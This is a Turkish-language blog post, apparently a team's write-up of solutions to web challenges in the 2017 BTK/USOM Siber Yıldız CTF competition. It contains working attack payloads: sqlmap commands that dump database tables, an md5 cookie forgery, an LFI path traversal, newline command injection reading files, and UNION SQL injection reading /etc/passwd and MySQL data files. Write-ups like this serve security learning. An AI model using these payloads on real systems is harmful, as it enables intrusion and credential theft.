<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>Mustafa ALTINKAYNAK - BTK (USOM) Siber Yıldız Yarışması Çözümleri</title>
        <meta name="description" content="" />

        <meta name="HandheldFriendly" content="True" />
        <meta name="MobileOptimized" content="320" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />

        <link rel="shortcut icon" href="https://www.mustafa.com.tr/assets/images/favicon.png">
        <link rel="stylesheet" type="text/css" href="https://www.mustafa.com.tr/theme/css/bootstrap.min.css" />
        <link rel="stylesheet" type="text/css" href="https://www.mustafa.com.tr/theme/css/custom.css"/>
        <link rel="stylesheet" type="text/css" href="https://www.mustafa.com.tr/theme/css/pygments.css"/>
        <link rel="stylesheet" type="text/css" href="https://www.mustafa.com.tr/theme/css/monosocialiconsfont.css"/>
        <link rel="stylesheet" href="https://www.mustafa.com.tr/theme/tipuesearch/tipuesearch.css">
        <link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,300&subset=latin,latin-ext' rel='stylesheet' type='text/css'>

        <link href="https://www.mustafa.com.tr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Mustafa ALTINKAYNAK Full Atom Feed" />
        <link href="https://www.mustafa.com.tr/feeds/all.rss" type="application/rss+xml" rel="alternate" title="Mustafa ALTINKAYNAK Full RSS Feed" />
        <link href="https://www.mustafa.com.tr/feeds/genel.atom.xml" type="application/atom+xml" rel="alternate" title="Mustafa ALTINKAYNAK Categories Atom Feed" />

<meta name="tags" content="siberyildiz" />
<meta name="tags" content="USOM" />
<meta name="tags" content="BTK" />
<meta name="tags" content="siber güvenlik yarışması" />
    </head>
    <body class="home-template">
        <div class="container">
            <div class="col-md-10 col-md-offset-1 col-sm-12 col-xs-12">
<main class="content" role="main">
    <div class="row">
        <article class="post tag-play tag-security">
          <header class="post-header">
            <a class="blog-logo" href="/">
              <span class="blog-title">Mustafa ALTINKAYNAK</span>
            </a>
          </header>
           
            <h1 class="post-title">BTK (USOM) Siber Yıldız Yarışması Çözümleri</h1>


            <section class="post-content">
              <h2>Siber Yıldız Yarışması nedir?</h2>
<p><img alt="" src="assets/images/siberyildiz/siber.jpeg" /></p>
<p>Türkiye'de var olan Siber Güvenlik Uzmanlarının keşfedileceği, onları cesaretlendirip, onore edici ödüllerin de verileceği ülkemizin 2017 yılı Siber Yıldızlarının belirleneceği Siber Güvenlik Yarışmasıdır.</p>
<p>Yarışmayı <strong>KırmızıBeyaz</strong> ekibi olarak başarıyla tamamladık. Takım arkadaşlarım <strong>Hakan ERYAVUZ</strong>, <strong>Besim ALTINOK</strong> ve <strong>Meryem AKDOĞAN</strong>'ı kutluyorum. Resmi açıklamayı bekliyoruz. Bu sürede sizlerle çözümlediğimiz soruları paylaşmak istedik. Besim Altınok'un <a href="https://github.com/besimaltnok/siberyildiz">github hesabından</a> diğer sorulara ulaşabilirsiniz. Sorular yazıldıkça içerik güncellenecektir.</p>
<h2>2. Bakalım ne kadar iyisin?</h2>
<p><img alt="" src="assets/images/siberyildiz/soru2/1.png" />
Bu soru basit bir SQL injection sorusuydu. Başta temel SQL injection ile ilerledik. Kullanıcı adı kısmına sayfanın altında yer alan ibareden hareketle <strong>Yonetici</strong>, parola kısmına ise <strong>'1 'or'='1</strong> şeklinde yazdığımızda sayfa çıktısında "<strong>giriş yaptın</strong>" şeklinde ibare aldık. Artık bariz SQL injection olduğu ortada idi.</p>
<p><img alt="" src="assets/images/siberyildiz/soru2/2.png" /></p>
<p>Hedef uygulama üzerinde boolean ve time based olmak üzere iki farklı SQL injection zafiyeti tespit ettik. Bağlantımızın yavaş olması nedeniyle time based üzerinden sonuç alamayabilirdik. Bu yüzden boolean SQL injection tekniğiyle ilerledik. Sqlmap aracıyla yeni tanışanlar için basit şekilde anlatmak istiyorum.</p>
<p>Aşağıdaki komut ile birlikte <strong>parola</strong> parametresini hedef alarak <strong>dbs</strong> parametresi sayesinde veritabanı listesini getirdik.</p>
<div class="highlight"><pre><span class="code-line">  <span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s">&quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&quot;</span> <span class="o">--</span><span class="n">data</span><span class="o">=</span><span class="s">&quot;kullaniciadi=Yonetici&amp;parola=&quot;</span> <span class="o">-</span><span class="n">p</span> <span class="n">parola</span> <span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span>  <span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span> <span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">mysql</span> <span class="o">--</span><span class="n">dbs</span></span>
</pre></div>


<p>Bu komutta ise bir önceki komut ile elde ettiğimiz <strong>web2</strong> adındaki veritabanında yer alan tüm tabloları getirdik.</p>
<div class="highlight"><pre><span class="code-line">  <span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s">&quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&quot;</span> <span class="o">--</span><span class="n">data</span><span class="o">=</span><span class="s">&quot;kullaniciadi=Yonetici&amp;parola=&quot;</span> <span class="o">-</span><span class="n">p</span> <span class="n">parola</span> <span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span> <span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span> <span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">mysql</span> <span class="o">-</span><span class="n">D</span> <span class="n">web2</span> <span class="o">--</span><span class="n">tables</span></span>
</pre></div>


<p>Aşağıdaki komut ile birlikte bir önceki komutlar ile elde ettiğimiz "web2" ve "kullanıcılar" tablosunun dökümünü(<strong>--dump</strong>) aldık.</p>
<div class="highlight"><pre><span class="code-line">  <span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s">&quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&quot;</span> <span class="o">--</span><span class="n">data</span><span class="o">=</span><span class="s">&quot;kullaniciadi=Yonetici&amp;parola=&quot;</span> <span class="o">-</span><span class="n">p</span> <span class="n">parola</span> <span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span> <span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span> <span class="o">--</span><span class="n">dbms</span><span class="o">=</span><span class="n">mysql</span> <span class="o">--</span><span class="n">dbs</span> <span class="o">--</span><span class="n">random</span><span class="o">-</span><span class="n">agent</span> <span class="o">-</span><span class="n">D</span> <span class="n">web2</span> <span class="o">-</span><span class="n">T</span> <span class="n">kullanicilar</span> <span class="o">--</span><span class="n">dump</span></span>
</pre></div>


<p>İlgili flag kullanıcılar tablosunda yer almaktaydı ve flag boolean tekniğiyle karşımıza geldi.</p>
<div class="highlight"><pre><span class="code-line">  <span class="nl">FLAG:</span> <span class="n">f4aa0edc033b9dfcc676c33420996789</span></span>
</pre></div>


<h2>3. Yetkili bir kullanıcı ile giriş yapman lazım.</h2>
<p>Bu sayfada ise bizi websitesi karşılıyor.</p>
<p><img alt="" src="assets/images/siberyildiz/soru3/1.png" /></p>
<p>Sayfa içerisinde gezinirken bir yandan da headerı kontrol ediyordum. Header içerisinde isAdmin=cfcd208495d565ef66e7dff9f98764da şeklinde tanımlanmış bir cookie bilgisine ulaştık. <strong>cfcd208495d565ef66e7dff9f98764da</strong> md5 değerini çözünce 0 olarak gördük. Yani <strong>isAdmin=md5(1)</strong> yapmamız durumunda hak yükseltebilirdik. <strong>isAdmin=c4ca4238a0b923820dcc509a6f75849b</strong> şeklinde isteklerimizi gönderdiğimizde bilgiler.php dosyasında flage ulaştık.</p>
<h2>4. Şimdi de uygulamanın kullandığı veritabanı parolası lazım.</h2>
<p>Bu soruya giriş yaptığımızda "404 NOT Found" hata sayfası ile karşılaşılıyordu. Sayfanın kaynağını incelediğimiz de CSS ile gizlenmiş şekilde bir form yer alıyordu.</p>
<p><img alt="" src="assets/images/siberyildiz/soru4/sanayihirsizligi-2.png" /></p>
<p>Görünür hale getirdikten sonra "<strong>admin</strong>","<strong>admin</strong>" ikisiyle içeri girdik.</p>
<p>Bilet Satış Platformunda başlığında bir sayfaya yönlendirildik. Bu sayfada "<strong>index.php?file=firmalar.php</strong>", "<strong>index.php?file=sitekullanimi.php</strong>" gibi URL bilgilerini görünce LFI olduğunu doğrudan anladık.</p>
<p><strong>index.php?file=firmalar.php</strong> sayfası üzerinde almış olduğumuz <strong>/home/sites/siberyildiz/files/inc/pages/firmalar.php syntax error on line 11</strong> hatası ise dizini tespit etmemize yardımcı oldu. Bulunduğumuz dizinin pages dizini olduğunu gördük.</p>
<p><img alt="" src="assets/images/siberyildiz/soru4/soru4-2.jpg" /></p>
<p>Genellikle web geliştirici veritabanı bağlantı bilgilerini "includes","inc","db" gibi klasörler altında "<strong>ayar.php</strong>","<strong>ayarlar.php</strong>","<strong>connect.php</strong>","<strong>conn.php</strong>","<strong>db.php</strong>" gibi dosya isimlerinde tutmaktadır. Bu teoriden yola çıkarak bir üst dizine çıkmamızı ve db.php dosyasını içeri çağıran URL ile birlikte <strong>index.php?file=../db.php</strong> kolayca flagi elde ettik.</p>
<p><img alt="" src="assets/images/siberyildiz/soru4/sanayihirsizligi-3.png" /></p>
<p>Kahraman Şehidimiz <strong>Ömer Halis DEMİR</strong>'e Allah'dan rahmet diliyoruz.</p>
<h2>11. Bu görev önünde iki seçenek var : başarılı olursun veya olamazsın?</h2>
<p>Bu soruya giriş yapıldığında "nothing here" şeklinde bir ibare karşılıyordu. Ne olabilir diye düşünürken robots.txt dosyasını görüntüledik. İçerisinde yer alan Disallow: cannotfindme bilgisi üzerine cannotfindme dizinine geçtik. Burada ufak bir giriş alanı gördük.</p>
<p><img alt="" src="assets/images/siberyildiz/soru11/1.png" /></p>
<p>Kullanıcı adı "admin" olarak giriş yaptığımızda, yeni bir alan ve form açıldı.</p>
<p><img alt="" src="assets/images/siberyildiz/soru11/2.png" /></p>
<p>Giriş yaptığımız yerde bizden komut çalıştırılması isteniyordu. http://www.hedef.com/?pass=sifre&amp;cmd=ls şeklinde oluşan link üzerinde pass değişkenini brute force uygulamak CTF mantığımıza aykırı gelmişti.</p>
<p>Kısa süre sonra array injection ile birlikte ?pass[]=&amp;cmd=ls olarak dosyaları listelemeyi başardık. İlgili dizinde <strong>"index.php"</strong>,<strong>"readme.txt"</strong> ve <strong>"try.html"</strong> dosyalarının olduğunu gördüm. <strong>try.html</strong> dosyası içerisinde <strong>read file /tmp/isThatFlag.txt</strong> ifadesi yer alıyor fakat sistem <strong>ls</strong> harici komut çalıştırmamıza izin vermiyordu.</p>
<p>Bunun üzerine /tmp altındaki <strong>isThatFlag.txt</strong> dosyasını okumak için new line yani bir alt satıra geç ifadesinin encode değeri olan <strong>%0a</strong> ifadesini kullandık. <strong>http://hedef.com/cannotfindme/?pass[]=&amp;cmd=ls%0acat%20/tmp/isThatFlag.txt</strong> ile birlikte flagi elde ettik.</p>
<h2>12. Yapabileceğine inancımız tam.?</h2>
<p><img alt="" src="assets/images/siberyildiz/soru12/1.jpg" /></p>
<p>Bu soruda ise resimden göreceğiniz üzere iki adet bağlantı yer almaktadır. Ek olarak index.php?id=1 bağlantısı üzerinden dosya indirebileceğimiz söylenmektedir. Bağlantıya tıkladığımızda "a.jpg" isimli boş bir dosyanın indirildiğini görüyoruz.</p>
<p>Muhtemelen aşağıdaki şekilde bir SQL sorgusu arka planda işlemektedir.</p>
<div class="highlight"><pre><span class="code-line"><span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">files</span> <span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span></span>
</pre></div>


<p>Biz bunu şu şekilde yaparsak dosya indirebiliriz.</p>
<div class="highlight"><pre><span class="code-line"><span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">files</span> <span class="n">where</span> <span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="mi">1</span><span class="p">,</span><span class="err">&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="err">&#39;</span> <span class="o">%</span><span class="mi">23</span></span>
</pre></div>


<p>Bir UNION SQL injection kuralı gereği ilk sorguda kaç kolon dönüyorsa, ikinci sorguda aynı sayıda kolonun dönmesi gerekmektedir. Bu yüzden UNION'dan sonra 1 ifadesini yalnızca kolon olması adına ekledik.</p>
<p><img alt="" src="assets/images/siberyildiz/soru12/2.jpg" /></p>
<p>Biraz uğraşın ardında diğer sayfalarda yer alan SQL bağlantı hataları izlenimindeki ifadeler üzerinden "users" veritabanına girebilmek adına yedeklerine ulaşmak için /var/lib/mysql/ altından ilgili veritabanı ve tablo bilgilerini indirdik. /var/lib/mysql dizini altında veritabanları, kolonlar ve içerikleri yer almaktadır.</p>
<div class="highlight"><pre><span class="code-line"><span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">files</span> <span class="n">where</span> <span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="err">&#39;</span> <span class="n">UNION</span> <span class="mi">1</span><span class="p">,</span><span class="err">&#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="n">MYD</span><span class="err">&#39;</span> <span class="o">%</span><span class="mi">23</span></span>
</pre></div>


<p>Elde ettiğimiz login.MYD dosyasını string ile okuduğumuzda giriş bilgilerini elde ettik.</p>
<div class="highlight"><pre><span class="code-line"><span class="n">mustafaaltinkaynak</span><span class="o">:</span><span class="n">mustafaaltinkaynak$</span> <span class="n">strings</span> <span class="n">login</span><span class="o">.</span><span class="na">MYD</span></span>
<span class="code-line"><span class="n">admin</span></span>
<span class="code-line"><span class="n">bu1Parolami</span><span class="o">?</span><span class="n">Sence</span><span class="o">?</span></span>
</pre></div>


<p>Elde ettiğimiz bu bilgiyi ikinci bağlantıda yer alan ?username=DENEME&amp;password=deneme ile giriş yapabilirsiniz ibaresinin yer aldığı kısıma GET isteği şeklinde gönderdiğimizde flagi elde ettik.</p>
<p><img alt="" src="assets/images/siberyildiz/soru12/4.jpg" /></p>
            </section>

            <footer class="post-footer">
                <section>
                  <span class="post-meta">
                    Tags:                     <a href="https://www.mustafa.com.tr/tag/siberyildiz.html">siberyildiz</a>,                     <a href="https://www.mustafa.com.tr/tag/usom.html">USOM</a>,                     <a href="https://www.mustafa.com.tr/tag/btk.html">BTK</a>,                     <a href="https://www.mustafa.com.tr/tag/siber-guvenlik-yarismasi.html">siber güvenlik yarışması</a>                  </span>
                </section>

                <section class="share">
                    <h4>Share this post</h4>
                    <a class="icon-twitter" href="http://twitter.com/share?text=BTK (USOM) Siber Yıldız Yarışması Çözümleri&url=https://www.mustafa.com.tr/btk-usom-siber-yildiz-yarismasi-cozumleri.html"
                        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                        <span class="hidden">Twitter</span>
                        <span class='symbol'>circletwitterbird</span>
                    </a>
                    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://www.mustafa.com.tr/btk-usom-siber-yildiz-yarismasi-cozumleri.html"
                        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
                        <span class="hidden">Facebook</span>
                        <span class='symbol'>circlefacebook</span>
                    </a>
                    <a class="icon-google-plus" href="https://plus.google.com/share?url=https://www.mustafa.com.tr/btk-usom-siber-yildiz-yarismasi-cozumleri.html"
                       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
                        <span class="hidden">Google+</span>
                        <span class='symbol'>circlegoogleplus</span>
                    </a>
                </section>

            </footer>

            <div id="disqus_thread"></div>
            <script>
            (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//mustafaaltinkaynak.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
            })();
            </script>
            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
        </article>
    </div>
</main>
                <footer class="site-footer">
                    <a class="subscribe icon-feed" href="https://www.mustafa.com.tr/feeds/all.rss"><span class="tooltip"><span class="symbol">blip</span></span></a>
                    <a class="subscribe icon-feed" href="https://www.mustafa.com.tr/archives.html"><span class="tooltip"><span class="symbol">star</span></span></a>
                    <div class="inner">
                         <section class="copyright">mustafaaltinkaynak &copy; 2015</section>
                    </div>
                </footer>

                <!-- Yandex.Metrika counter -->
                <script type="text/javascript">
                    (function (d, w, c) {
                        (w[c] = w[c] || []).push(function() {
                            try {
                                w.yaCounter39549065 = new Ya.Metrika({
                                    id:39549065,
                                    clickmap:true,
                                    trackLinks:true,
                                    accurateTrackBounce:true
                                });
                            } catch(e) { }
                        });

                        var n = d.getElementsByTagName("script")[0],
                            s = d.createElement("script"),
                            f = function () { n.parentNode.insertBefore(s, n); };
                        s.type = "text/javascript";
                        s.async = true;
                        s.src = "https://mc.yandex.ru/metrika/watch.js";

                        if (w.opera == "[object Opera]") {
                            d.addEventListener("DOMContentLoaded", f, false);
                        } else { f(); }
                    })(document, window, "yandex_metrika_callbacks");
                </script>
                <noscript><div><img src="https://mc.yandex.ru/watch/39549065" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
                <!-- /Yandex.Metrika counter -->


            </div>
        </div>
    </body>
</html>